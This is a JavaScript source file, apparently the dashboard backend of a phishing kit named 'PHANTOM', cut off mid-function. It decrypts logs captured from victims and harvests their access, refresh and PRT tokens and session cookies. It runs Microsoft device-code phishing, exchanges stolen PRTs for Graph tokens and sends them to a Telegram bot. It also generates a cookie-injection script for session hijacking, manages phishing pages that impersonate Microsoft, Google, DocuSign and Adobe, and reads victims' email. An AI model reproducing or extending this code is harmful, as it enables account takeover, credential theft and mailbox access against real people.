// ============================================================
// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS)
// ============================================================
async function handleDashboardAPI(req, res) {
    const url = req.url;
    // Remove leading /dash if present, so we can match /api/...
    let apiPath = url;
    if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');

    // ── Test Telegram ──
    if (apiPath === '/api/test-telegram') {
        try {
            if (!axios) throw new Error('axios not installed');
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`
            }, { timeout: 5000 });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, message: 'Test sent', response: response.status }));
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: e.message, details: e.response?.data || '' }));
        }
        return;
    }

    // ── Status ──
    if (apiPath === '/api/status') {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ online: true, totalSessions: files.length }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Logs ──
    if (apiPath === '/api/logs') {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            const logs = files.map(f => {
                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
                return { name: f, size: stat.size, modified: stat.mtime };
            }).sort((a, b) => b.modified - a.modified);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(logs));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Log detail ──
    if (apiPath.startsWith('/api/log/')) {
        const filename = apiPath.replace('/api/log/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Not found' }));
            return;
        }
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            const entries = lines.map(line => {
                try {
                    const entry = JSON.parse(line);
                    const iv = Object.keys(entry)[0];
                    const encrypted = entry[iv];
                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                    decrypted = Buffer.concat([decrypted, decipher.final()]);
                    return JSON.parse(decrypted.toString('utf-8'));
                } catch (e) {
                    return { error: 'Failed to decrypt', raw: line };
                }
            });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ filename, entries }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Export ZIP ──
    if (apiPath === '/api/export/all' && AdmZip) {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            if (files.length === 0) {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'No logs' }));
                return;
            }
            const zip = new AdmZip();
            files.forEach(f => {
                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
                zip.addFile(f, content);
            });
            const zipBuffer = zip.toBuffer();
            res.writeHead(200, {
                'Content-Type': 'application/zip',
                'Content-Disposition': `attachment; filename=all_sessions_${Date.now()}.zip`
            });
            res.end(zipBuffer);
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Visits ──
    if (apiPath === '/api/visits') {
        try {
            if (!fs.existsSync(VISITS_LOG_FILE)) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ visits: [], total: 0, uniqueIPs: 0, today: 0 }));
                return;
            }
            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            const visits = lines.map(line => JSON.parse(line));
            visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
            const now = new Date();
            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ visits: visits.slice(0, 100), total: visits.length, uniqueIPs, today: todayVisits.length }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Vault endpoints ──
    if (apiPath === '/api/vault/scan' && req.method === 'POST') {
        try {
            const tokens = vault.scanLogs();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, count: tokens.length }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/vault/tokens') {
        try {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, tokens: vault.tokens || [] }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/vault/stats') {
        try {
            const stats = vault.getStats();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, stats }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/vault/healthcheck' && req.method === 'POST') {
        try {
            const results = await vault.healthCheckAll();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, results }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/vault/exchange' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { tokenValue } = JSON.parse(body);
                if (!tokenValue) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Token value required' }));
                    return;
                }
                const data = await vault.exchangeToken(tokenValue);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, data }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Device endpoints ──
    if (apiPath === '/api/device/request' && req.method === 'POST') {
        if (!axios) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'axios not installed' }));
            return;
        }
        try {
            const clientId = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
                new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
            );
            const data = response.data;
            const flow = {
                device_code: data.device_code,
                user_code: data.user_code,
                verification_uri: data.verification_uri,
                expires_in: data.expires_in,
                interval: data.interval,
                status: 'pending',
                created: new Date().toISOString(),
                client_id: clientId,
                session_id: crypto.randomBytes(16).toString('hex')
            };
            deviceFlows.push(flow);
            saveDeviceFlows();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(data));
        } catch (error) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: error.response?.data || error.message }));
        }
        return;
    }

    if (apiPath === '/api/device/token' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { device_code } = JSON.parse(body);
            if (!device_code) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'device_code required' }));
                return;
            }
            try {
                const flow = deviceFlows.find(f => f.device_code === device_code);
                const clientId = flow?.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                    new URLSearchParams({
                        client_id: clientId,
                        device_code,
                        grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                const tokens = response.data;
                if (flow) {
                    flow.status = 'approved';
                    flow.access_token = tokens.access_token;
                    flow.refresh_token = tokens.refresh_token;
                    flow.id_token = tokens.id_token;
                    flow.approved = new Date().toISOString();
                    saveDeviceFlows();
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(tokens));
            } catch (error) {
                if (error.response?.data?.error === 'authorization_pending') {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'authorization_pending' }));
                } else if (error.response?.data?.error === 'expired_token') {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'expired_token' }));
                } else {
                    res.writeHead(500);
                    res.end(JSON.stringify({ error: error.response?.data || error.message }));
                }
            }
        });
        return;
    }

    if (apiPath === '/api/device/history') {
        try {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, flows: deviceFlows }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/device/manual' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { user_code } = JSON.parse(body);
                if (!user_code) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'user_code required' }));
                    return;
                }
                const clientId = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
                    new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                const data = response.data;
                const flow = {
                    device_code: data.device_code,
                    user_code: user_code,
                    verification_uri: data.verification_uri,
                    expires_in: data.expires_in,
                    interval: data.interval,
                    status: 'pending',
                    created: new Date().toISOString(),
                    client_id: clientId,
                    session_id: crypto.randomBytes(16).toString('hex'),
                    manual_submitted: true
                };
                deviceFlows.push(flow);
                saveDeviceFlows();
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, flow }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: error.response?.data || error.message }));
            }
        });
        return;
    }

    if (apiPath === '/api/device/use' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { session_id } = JSON.parse(body);
                if (!session_id) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'session_id required' }));
                    return;
                }
                const flow = deviceFlows.find(f => f.session_id === session_id);
                if (!flow) {
                    res.writeHead(404);
                    res.end(JSON.stringify({ error: 'Flow not found' }));
                    return;
                }
                if (!flow.access_token) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No access token available' }));
                    return;
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    success: true,
                    access_token: flow.access_token,
                    refresh_token: flow.refresh_token,
                    id_token: flow.id_token,
                    username: flow.username || 'Unknown'
                }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: error.message }));
            }
        });
        return;
    }

    // ── PRT endpoints ──
    if (apiPath === '/api/prt/scan' && req.method === 'POST') {
        try {
            const prts = [];
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            for (const file of files) {
                try {
                    const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
                    const lines = content.split('\n').filter(line => line.trim());
                    for (const line of lines) {
                        try {
                            const entry = JSON.parse(line);
                            const iv = Object.keys(entry)[0];
                            const encrypted = entry[iv];
                            const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                            let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                            decrypted = Buffer.concat([decrypted, decipher.final()]);
                            const obj = JSON.parse(decrypted.toString('utf-8'));
                            const body = obj.proxyRequestBody;
                            if (body) {
                                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                                const prtMatch = bodyStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (prtMatch) {
                                    prts.push({
                                        prt: prtMatch[1],
                                        timestamp: obj.timestamp || new Date().toISOString(),
                                        source: obj.proxyRequestURL || 'Unknown',
                                        username: vault.extractUsernameFromToken(prtMatch[1])
                                    });
                                }
                            }
                        } catch (e) {}
                    }
                } catch (e) {}
            }
            prtStorage.prts = prts;
            prtStorage.lastScan = new Date().toISOString();
            savePRTStorage();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, count: prts.length, prts }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/prt/list') {
        try {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, prts: prtStorage.prts || [] }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/prt/exchange' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { prt } = JSON.parse(body);
                if (!prt) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'PRT required' }));
                    return;
                }
                const response = await retry(async () => {
                    return await axios.post(
                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                            assertion: prt,
                            requested_token_use: 'on_behalf_of',
                            scope: 'https://graph.microsoft.com/.default offline_access'
                        }),
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                    );
                }, 3, 1500, 2);
                const tokens = response.data;
                await sendToTelegram({ sessionId: 'prt_exchange', tokens });
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, data: tokens }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.response?.data || err.message }));
            }
        });
        return;
    }

    if (apiPath === '/api/prt/health' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { prt } = JSON.parse(body);
                if (!prt) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'PRT required' }));
                    return;
                }
                const response = await retry(async () => {
                    return await axios.post(
                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                            assertion: prt,
                            requested_token_use: 'on_behalf_of',
                            scope: 'https://graph.microsoft.com/.default offline_access'
                        }),
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                    );
                }, 2, 1000, 2);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, valid: true, data: response.data }));
            } catch (err) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, valid: false, error: err.response?.data?.error_description || err.message }));
            }
        });
        return;
    }

    if (apiPath === '/api/prt/health-all' && req.method === 'POST') {
        try {
            const results = [];
            for (const item of prtStorage.prts || []) {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                                assertion: item.prt,
                                requested_token_use: 'on_behalf_of',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    results.push({ username: item.username, valid: true, data: response.data });
                } catch (e) {
                    results.push({ username: item.username, valid: false, error: e.message });
                }
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, results }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/prt/exchange-all' && req.method === 'POST') {
        try {
            const results = [];
            for (const item of prtStorage.prts || []) {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                                assertion: item.prt,
                                requested_token_use: 'on_behalf_of',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    results.push({
                        username: item.username,
                        success: true,
                        access_token: response.data.access_token?.slice(0, 40) + '...',
                        refresh_token: response.data.refresh_token?.slice(0, 40) + '...'
                    });
                } catch (e) {
                    results.push({ username: item.username, success: false, error: e.message });
                }
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, results }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/prt/stats') {
        try {
            const total = prtStorage.prts?.length || 0;
            const uniqueUsers = new Set((prtStorage.prts || []).map(p => p.username)).size;
            const healthy = (prtStorage.prts || []).filter(p => p.last_refresh).length;
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                stats: { total, uniqueUsers, healthy, lastScan: prtStorage.lastScan }
            }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Tokens from log ──
    if (apiPath.startsWith('/api/tokens/')) {
        const filename = apiPath.replace('/api/tokens/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Log not found' }));
            return;
        }
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            const tokens = {
                access_tokens: [],
                refresh_tokens: [],
                id_tokens: [],
                prt_tokens: [],
                cookies: [],
                sessions: [],
                username: 'Unknown'
            };
            let username = 'Unknown';
            for (const line of lines) {
                try {
                    const entry = JSON.parse(line);
                    const iv = Object.keys(entry)[0];
                    const encrypted = entry[iv];
                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                    decrypted = Buffer.concat([decrypted, decipher.final()]);
                    const obj = JSON.parse(decrypted.toString('utf-8'));
                    const body = obj.proxyRequestBody;
                    if (body) {
                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                        if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                        if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
                        const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                        if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
                        const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                        if (prtMatch) tokens.prt_tokens.push(decodeURIComponent(prtMatch[1]));
                        try {
                            const parsed = typeof body === 'string' ? JSON.parse(body) : body;
                            if (parsed.username || parsed.login || parsed.user || parsed.Email) {
                                username = parsed.username || parsed.login || parsed.user || parsed.Email;
                            }
                        } catch (e) {}
                    }
                    if (obj.proxyResponseHeaders && obj.proxyResponseHeaders['set-cookie']) {
                        const cookieHeaders = obj.proxyResponseHeaders['set-cookie'];
                        const arr = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
                        arr.forEach(c => {
                            const [nameVal] = c.split(';');
                            if (nameVal) tokens.cookies.push(nameVal);
                        });
                    }
                } catch (e) {}
            }
            tokens.username = username;
            if (tokens.access_tokens.length > 0) {
                try {
                    const parts = tokens.access_tokens[0].split('.');
                    if (parts.length === 3) {
                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                        tokens.username = payload.email || payload.preferred_username || payload.upn || tokens.username;
                    }
                } catch (e) {}
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, tokens }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Analytics ──
    if (apiPath === '/api/analytics') {
        try {
            let visits = [];
            let captures = [];
            if (fs.existsSync(VISITS_LOG_FILE)) {
                const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                visits = lines.map(line => JSON.parse(line));
            }
            const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            captures = logFiles.map(f => {
                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
                return { file: f, modified: stat.mtime, size: stat.size };
            });
            const now = new Date();
            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
            const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
            const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
            const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
            const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
            const todayCaptures = captures.filter(c => c.modified >= today);
            const weekCaptures = captures.filter(c => c.modified >= weekAgo);
            const monthCaptures = captures.filter(c => c.modified >= monthAgo);
            const conversionRate = {
                today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
                week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
                month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
                total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
            };
            const dailyCaptures = {};
            const dailyVisits = {};
            for (let i = 6; i >= 0; i--) {
                const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
                const key = d.toDateString();
                dailyCaptures[key] = 0;
                dailyVisits[key] = 0;
            }
            captures.forEach(c => {
                const key = new Date(c.modified).toDateString();
                if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
            });
            visits.forEach(v => {
                const key = new Date(v.timestamp).toDateString();
                if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
            });
            const domains = {};
            visits.forEach(v => {
                const url = v.url || '';
                const match = url.match(/https?:\/\/([^\/]+)/);
                if (match) {
                    const domain = match[1];
                    domains[domain] = (domains[domain] || 0) + 1;
                }
            });
            const topDomains = Object.entries(domains)
                .sort((a, b) => b[1] - a[1])
                .slice(0, 5)
                .map(([domain, count]) => ({ domain, count }));
            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                analytics: {
                    visits: {
                        total: visits.length,
                        today: todayVisits.length,
                        week: weekVisits.length,
                        month: monthVisits.length
                    },
                    captures: {
                        total: captures.length,
                        today: todayCaptures.length,
                        week: weekCaptures.length,
                        month: monthCaptures.length
                    },
                    conversionRate,
                    uniqueIPs,
                    dailyCaptures,
                    dailyVisits,
                    topDomains,
                    captureTimeline: captures.map(c => ({
                        date: c.modified,
                        file: c.file,
                        size: c.size
                    }))
                }
            }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Replay ──
    if (apiPath.startsWith('/api/replay/')) {
        const filename = apiPath.replace('/api/replay/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Log not found' }));
            return;
        }
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            let allCookies = [];
            let targetDomain = null;
            let accessToken = null;
            let refreshToken = null;

            for (const line of lines) {
                try {
                    const entry = JSON.parse(line);
                    const iv = Object.keys(entry)[0];
                    const encrypted = entry[iv];
                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                    decrypted = Buffer.concat([decrypted, decipher.final()]);
                    const obj = JSON.parse(decrypted.toString('utf-8'));

                    if (!targetDomain && obj.proxyRequestURL) {
                        try {
                            const url = new URL(obj.proxyRequestURL);
                            targetDomain = url.hostname;
                        } catch (e) {}
                    }

                    const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                    if (setCookie) {
                        const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                        for (const cookie of cookieArray) {
                            const [nameValue] = cookie.split(';');
                            if (nameValue) allCookies.push(nameValue.trim());
                        }
                    }

                    const body = obj.proxyRequestBody;
                    if (body) {
                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                        if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                        if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
                    }
                } catch (e) {}
            }

            if (allCookies.length === 0 && !accessToken) {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'No cookies or tokens found' }));
                return;
            }

            const replayScript = `
                (function() {
                    const cookies = ${JSON.stringify(allCookies)};
                    const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
                    const accessToken = ${JSON.stringify(accessToken)};
                    const refreshToken = ${JSON.stringify(refreshToken)};
                    
                    cookies.forEach(c => {
                        document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
                    });
                    
                    let msg = '🍪 ' + cookies.length + ' cookies injected.';
                    if (accessToken) {
                        msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
                        localStorage.setItem('evil_token', accessToken);
                    }
                    if (refreshToken) {
                        msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
                    }
                    alert(msg);
                    window.location.href = 'https://' + targetDomain;
                })();
            `;

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                cookieCount: allCookies.length,
                targetDomain: targetDomain || 'login.microsoftonline.com',
                hasAccessToken: !!accessToken,
                hasRefreshToken: !!refreshToken,
                replayScript: replayScript,
                cookieString: allCookies.join('; ')
            }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    // ── Phishlets ──
    if (apiPath === '/api/phishlets') {
        try {
            const phishlets = {
                microsoft: { name: 'Microsoft 365', file: 'microsoft.html', entryPoint: '/login', enabled: true },
                google: { name: 'Google', file: 'google.html', entryPoint: '/accounts', enabled: true },
                docusign: { name: 'DocuSign', file: 'docusign.html', entryPoint: '/signin', enabled: false },
                adobe: { name: 'Adobe', file: 'adobe.html', entryPoint: '/login', enabled: false }
            };
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, phishlets }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return;
    }

    if (apiPath === '/api/phishlets/toggle' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { id, enabled } = JSON.parse(body);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, message: `${id} ${enabled ? 'enabled' : 'disabled'}` }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Recon ──
    if (apiPath === '/api/recon' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken } = JSON.parse(body);
                if (!accessToken) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Access token required' }));
                    return;
                }
                const graph = new GraphClient(accessToken);
                const profile = await graph.getUserProfile();
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, profile }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Webmail folders ──
    if (apiPath === '/api/webmail/folders' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken } = JSON.parse(body);
                if (!accessToken) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Access token required' }));
                    return;
                }
                const graph = new GraphClient(accessToken);
                const folders = await graph.get('/me/mailFolders');
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, folders: folders.value || [] }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Webmail emails ──
    if (apiPath === '/api/webmail/emails' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = JSON.parse(body);
                if (!accessToken) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Access token required' }));
                    return;
                }
                const graph = new GraphClient(accessToken);
                let endpoint;
